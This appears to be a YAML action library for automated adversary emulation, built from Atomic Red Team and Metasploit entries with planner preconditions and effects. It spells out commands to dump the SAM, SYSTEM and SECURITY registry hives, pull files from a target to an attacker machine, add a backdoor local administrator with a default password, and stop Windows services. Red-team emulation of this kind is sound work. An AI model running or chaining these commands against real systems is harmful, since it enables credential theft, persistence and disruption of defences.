  - uuid: art-t1003_002-reg-save-sam
    name: Registry dump of SAM, creds, and secrets
    id:
      - T1003.002
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: Security Account Manager'
    description: |
      `reg save` writes the SAM, SYSTEM and SECURITY registry hives to a
      target-side directory (default `%TEMP%`). The hives hold encrypted /
      structured credential material — offline processing (impacket-
      secretsdump, creddump7, PowerDump, …) is a separate step and is NOT
      modelled by this action. A chain that wants to close the credential-
      access stage via this path must include downstream file exfil +
      offline-parse actions. ART auto_generated_guid
      5c2571d0-1572-416d-9676-812e64ca9f44.
    execution:
      executor: Command Prompt Executor
      command: |
        reg save HKLM\sam #{save_dir}\sam
        reg save HKLM\system #{save_dir}\system
        reg save HKLM\security #{save_dir}\security
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke reg save.
        required: true
        pddl_index: executor2_var_in_plan
      save_dir:
        default: '%TEMP%'
        description: Directory on the target where the SAM / SYSTEM / SECURITY hives
          are written.
        required: true
        pddl_index: string4_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-in-file ?d - data ?f - file)
      - (file-exists ?path - string ?f - file ?target - host)
      - (callback-covered ?f - file)
  - uuid: meterpreter-download
    name: File Download Operation
    id:
      - T1020
    source: Metasploit
    supported_platforms:
      - windows
      - linux
    tactics:
      - Collection
    technique:
      - Data from Local System
    description: The `download` command transfers files from the target system to
      the attacker machine.
    execution:
      executor: Meterpreter Executor
      command: download(remote_path=#{remote_path}, local_path=#{output_dir}, meterpreter_sessionid=#{executor})
    arguments:
      executor:
        description: The Meterpreter session ID of the active Metasploit connection.
        required: true
        pddl_index: executor4_var_in_plan
      remote_path:
        description: Full path to remote file/directory
        required: true
        pddl_index: string4_var_in_plan
      output_dir:
        default: /tmp
        description: Local directory to save files
        required: true
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
      - (meterpreter-session ?executorID - executor ?target - host)
      - (file-exists ?remote_path - string ?file - file ?target - host)
    effects:
      - (file-on-attacker ?localpath - string ?file - file)
  - uuid: art-t1136_001-net-user-admin
    name: Create a new Windows admin user
    id:
      - T1136.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Create Account: Local Account'
    description: |
      Creates a new local account and adds it to the local `administrators`
      group in one shot. Strong persistence pattern — attacker gains a
      privileged backdoor account. ART auto_generated_guid
      fda74566-a604-4581-a4cc-fbbe21d66559.
    execution:
      executor: Command Prompt Executor
      command: |
        net user /add "#{username}" "#{password}"
        net localgroup administrators "#{username}" /add
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke net.
        required: true
        pddl_index: executor2_var_in_plan
      username:
        default: BackupAdmin
        description: Local admin account name to create.
        required: true
      password:
        default: ComplexPass!23
        description: Password for the new admin account.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (user-created ?u - user ?target - host)
  - uuid: art-t1489-sc-stop-service
    name: Windows - Stop service using Service Controller
    id:
      - T1489
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - Service Stop
    description: |
      Stops a Windows service via `sc.exe stop`. Ransomware and disk-wiper
      actors commonly stop security services (Defender), backup services
      (VSS), and databases (MSSQL) before proceeding with impact. Requires
      admin. ART auto_generated_guid 21dfb440-830d-4c86-a3e5-2a491d5a8d04.
    execution:
      executor: Command Prompt Executor
      command: |
        sc.exe stop #{service_name}
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke sc.exe.
        required: true
        pddl_index: executor2_var_in_plan
      service_name:
        default: spooler
        description: Name of the Windows service to stop.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (process-terminated ?p - process ?target - host)
